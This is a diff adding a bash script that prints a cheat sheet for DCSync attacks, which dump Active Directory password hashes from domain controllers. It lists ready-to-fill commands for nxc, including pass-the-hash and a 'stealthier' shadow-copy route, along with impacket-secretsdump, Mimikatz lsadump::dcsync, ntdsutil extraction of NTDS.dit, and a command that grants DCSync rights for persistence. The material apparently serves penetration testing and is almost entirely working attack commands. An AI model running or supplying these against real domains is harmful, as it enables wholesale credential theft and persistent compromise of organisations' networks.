@@ -1,0 +1,45 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── DCSYNC — NTDS DUMP ───────────────────────────────${NC}"
+printf "\n"
+
+echo -e "  Note: Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All"
+echo -e "  Note: (Domain Admin, or explicitly delegated)"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc (primary) ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb <DC_IP> -u <USER> -p <PASS> --ntds${NC}                      # all hashes"
+echo -e "  ${GREEN}nxc smb <DC_IP> -u <USER> -H <NTLM> --ntds${NC}                      # PTH"
+echo -e "  ${GREEN}nxc smb <DC_IP> -u <USER> -p <PASS> --ntds vss${NC}                  # via VSS (stealthier)"
+echo -e "  ${GREEN}nxc smb <DC_IP> -u <USER> -p <PASS> --ntds drsuapi --user krbtgt${NC} # single user"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── impacket-secretsdump ─────────────────────────────${NC}"
+echo -e "  ${GREEN}impacket-secretsdump -outputfile dcsync -dc-ip <DC_IP> DOMAIN/user:pass@<DC>${NC}"
+echo -e "  ${GREEN}impacket-secretsdump -hashes :<NT_HASH> -dc-ip <DC_IP> DOMAIN/user@<DC>${NC}"
+echo -e "  ${GREEN}KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass -dc-ip <DC_IP> @<DC>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Mimikatz (on DC) ─────────────────────────────────${NC}"
+echo -e "  ${GREEN}lsadump::dcsync /domain:corp.com /user:corp\\krbtgt${NC}"
+echo -e "  ${GREEN}lsadump::dcsync /domain:corp.com /all /csv${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── NTDS.dit — Manual (on DC) ────────────────────────${NC}"
+echo -e "  ${GREEN}ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\Windows\\Temp\\NTDS' quit quit${NC}"
+echo -e "  ${GREEN}impacket-secretsdump -ntds ntds.dit -system system.save LOCAL${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Grant DCSync Rights (persistence) ────────────────${NC}"
+echo -e "  ${GREEN}Add-ObjectACL -TargetDistinguishedName 'dc=corp,dc=com' -PrincipalSamAccountName <USER> -Rights DCSync${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
